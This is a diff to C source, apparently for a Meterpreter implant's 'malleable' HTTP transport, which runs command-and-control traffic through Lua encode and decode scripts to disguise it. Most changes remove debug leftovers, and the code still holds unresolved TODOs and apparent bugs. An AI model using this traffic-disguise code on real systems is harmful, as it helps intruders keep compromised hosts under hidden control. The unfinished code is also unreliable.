@@ -5,7 +5,7 @@
 */
 #include "../../common/common.h"
 #include "../../common/config.h"
-#include "server_transport_wininet.h"
+#include "server_transport_wininet_malleable.h"
 #include <winhttp.h>
 #include "../../common/packet_encryption.h"
 #include "../../common/pivot_packet_dispatch.h"
@@ -55,6 +55,7 @@ PUCHAR malleableEncode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
 		{ 
 			bail(L, "luaL_loadstring() failed");      /* Error out if file can't be read */
 			return NULL;
+			// return buffer; // Do we want to crash the meterpreter by returning NULL or do we want to return normal operations?
 		}
 			
 		dprintf("[MALLEABLE-ENCODE] lua_pcall(0,0,0) (init)");
@@ -80,6 +81,7 @@ PUCHAR malleableEncode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
 
 		const char* tmpResult = NULL;
 		tmpResult = luaL_tolstring(L, -1, &tmpLen);
+
 		PUCHAR encodedOut = NULL;
 		encodedOut = malloc(tmpLen);
 		if (encodedOut == NULL)
@@ -120,44 +122,22 @@ LPBYTE malleableDecode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
 		dprintf("[MALLEABLE-DECODE] LUA script not set yet");
 		result = 2;
 	}
-	/*
-	if (TRUE == TRUE){
-	return NULL;
-	const char *encodedOut = "Pls work now";
-	return _strdup(encodedOut);
-	}
-	*/
-	/*
-	if (size == NULL){
-	dprintf("[MALLEABLE-DECODE] size reference was NULL!");
-	result = ERROR; // TODO real error code
-	}
-	*/
+
 	if (result == ERROR_SUCCESS){
 		dprintf("[MALLEABLE-DECODE] Starting buffer stuff");
 		dprintf("[MALLEABLE-DECODE] Size: %i", size);
 		size_t testSize = (size_t)*size;
-		//void *dest = malloc((size_t)size + 1); // i think need to free data mby +1 needs to go away 
-		//strcpy_s((const char*)data, (size_t)size, (char*) buffer); //mby manually null terminate
-		// this things is probalby terminating on null bytes, we dont wan't that we want to copy everything!
 
-		//strncpy_s((char*)dest, (size_t)testSize + 1, (char*)buffer, (size_t)testSize - 1);
-		//dprintf("[MALLEABLE-DECODE] String address: %x", dest);
-		//dprintf("[MALLEABLE-DECODE] String: %s", dest);
-		//if (!strcmp(dest, ""))
-		//{
 		dprintf("[MALLEABLE-DECODE] Encoding for transport.");
 		lua_State *L;
 		L = luaL_newstate();                        /* Create Lua state variable */
 		luaL_openlibs(L);                           /* Load Lua libraries */
-		//dprintf("[MALLEABLE] luaL_loadstring(): script: \"%s\"", luaScript);
-		//dprintf("[TIMOHELP] 888.1 luaScript %S", luaScript);
+
 		if (luaL_loadstring(L, luaScript)) /* Load but don't run the Lua scripnt */
 			bail(L, "luaL_loadstring() failed");      /* Error out if file can't be read */
 		dprintf("[MALLEABLE-DECODE] lua_pcall(0,0,0) (init)");
 		dprintf("[MALLEABLE-DECODE] LUA pcall answer: %i", lua_pcall(L, 0, 0, 0));
-		//if (lua_pcall(L, 0, 0, 0))                  /* PRIMING RUN. FORGET THIS AND YOU'RE TOAST */
-		//	bail(L, "lua_pcall() failed");          /* Error out if Lua file has an error */
+
 		dprintf("[MALLEABLE-DECODE] LUA getglobal");
 		lua_getglobal(L, "decode");
 		dprintf("[MALLEABLE-DECODE] LUA pushlstring");
@@ -177,21 +157,14 @@ LPBYTE malleableDecode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
 		dprintf("[MALLEABLE-DECODE] Got \"%s\" back from lua_tostring()", decodedOut);
 		dprintf("[MALLEABLE-DECODE] Giving buffer(%x) address %x", decodedOut);
 		dprintf("[MALLEABLE-DECODE] Still going strong");
-		//SAFE_FREE(dest);
+
 		dprintf("[MALLEABLE-DECODE] 10");
 		lua_close(L);
 		dprintf("[MALLEABLE-DECODE] 20");
 		SAFE_FREE(buffer);
-		dprintf("[MALLEABLE-DECODE] 30");
-		//buffer = malloc(tmpLen);
-		dprintf("[MALLEABLE-DECODE] 40");
-		//memset(buffer, 0, tmpLen);
-		dprintf("[MALLEABLE-DECODE] 42");
-		//memcpy_s(buffer, tmpLen, decodedOut, tmpLen);
-		dprintf("[MALLEABLE-DECODE] 50");
 
 		dprintf("[MALLEABLE-DECODE] DONE");
-		//return _strdup(decodedOut);
+
 		if (decodedOut == NULL)
 		{
 			dprintf("[MALLEABLE-DECODE] ERROR decodedOut == NULL");
@@ -397,7 +370,7 @@ static BOOL send_request_winhttp_malleable(HttpTransportContext* ctx, HANDLE hRe
 	dprintf("[WINHTTP MALLEABLE] Starting sendrequest; size: %i. buffer: %s",size, buffer);
 	dprintf("[WINHTTP MALLEABLE] Buffer address begin: %x", buffer);
 	BOOL result;
-	
+	// TODO TIMO, we need to handle having custom headers, also better handling of buffer NULL
 	if (buffer != NULL)
 	{
 		LPVOID encodedBuffer = NULL;
@@ -410,26 +383,6 @@ static BOOL send_request_winhttp_malleable(HttpTransportContext* ctx, HANDLE hRe
 		result = WinHttpSendRequest(hReq, NULL, 0, encodedBuffer, size, size, 0);
 		SAFE_FREE(encodedBuffer);
 		return result;
-		/* TODO need to delete
-		dprintf("[WINHTTP MALLEABLE] Got size from malleableEncoded: size: %i", size);
-		if (encodedBuffer == NULL)
-		{
-			dprintf("[WINHTTP MALLEABLE] Error during malleableEncode, encodedBuffer == NULL !");
-			return FALSE;
-		}
-		//dprintf("[TIMOHELP] 799");
-		//SAFE_FREE(buffer);
-		dprintf("[TIMOHELP] 799.1");
-
-		buffer = realloc(encodedBuffer, size);
-		dprintf("[TIMOHELP] 800");
-		SAFE_FREE(encodedBuffer);
-		dprintf("[TIMOHELP] 801");
-		if (buffer == NULL)
-		{
-			dprintf("[WINHTTP MALLEABLE] Error during Buffer realloc");
-			return FALSE;
-		}*/
 	}
 	if (ctx->custom_headers)
 	{
@@ -492,8 +445,9 @@ static DWORD validate_response_winhttp_malleable(HANDLE hReq, HttpTransportConte
 
 			// TIMO check out these failure cases with malleable
 
-			if (ctx->cert_hash == NULL && statusCode == 407)
+			if (ctx->cert_hash == NULL && statusCode == 407 ) //|| statusCode == 403) // TODO TIMO ADDED THIS 403
 			{
+				dprintf("[TIMOHELP 8888] WINHTTP cannot connect ");
 				return ERROR_WINHTTP_CANNOT_CONNECT;
 			}
 
@@ -1004,15 +958,15 @@ static DWORD server_deinit_http_malleable(Transport* transport)
 		ctx->close_req(ctx->internet);
 		ctx->internet = NULL;
 	}
-
+	dprintf("[TIMOHELP 8888] Move to wininet?");
 	// have we had issues that require us to move?
 	if (ctx->move_to_wininet)
 	{
+		dprintf("[TIMOHELP 8888] yes");
 		// yes, so switch on over.
-		transport_move_to_wininet(transport);
+		transport_move_to_wininet_malleable(transport);
 		ctx->move_to_wininet = FALSE;
 	}
-
 	return TRUE;
 }
 
@@ -1329,14 +1283,13 @@ Transport* transport_create_http_malleable(MetsrvTransportHttp* config, LPDWORD 
 //	dprintf("[TRANS HTTP MALLEABLE-----] Given LUA script: %S", config->malleable_script);
 	if (config->malleable_script[0])
 	{
-		dprintf("[TIMOHELP] 200.81 luaScript copy begin");
+		dprintf("[TIMOHELP] 200.81 luaScript copy begin %S", config->malleable_script);
 		// wcstombs(luaScript, config->malleable_script, MALLEABLE_SCRIPT_SIZE); // old implementation
 		ctx->malleable_script = _wcsdup(config->malleable_script);
 		dprintf("[TIMOHELP] 200.82 luaScript copy end");
 		//wcstombs_s(NULL, luaScript, sizeof(luaScript), config->malleable_script, sizeof(luaScript)); // TODO erno
 		//luaScript = (char*)(config->malleable_script); // TODO TIMO include in ctx? also probably cancel if we don't have a script
 	}
-	dprintf("[TIMOHELP] 200.89 luaScript %S", ctx->malleable_script);
 	dprintf("[TIMOHELP] 200.9 Still works");
 
 	dprintf("[TRANS HTTP MALLEABLE] Given ua: %S", config->ua);
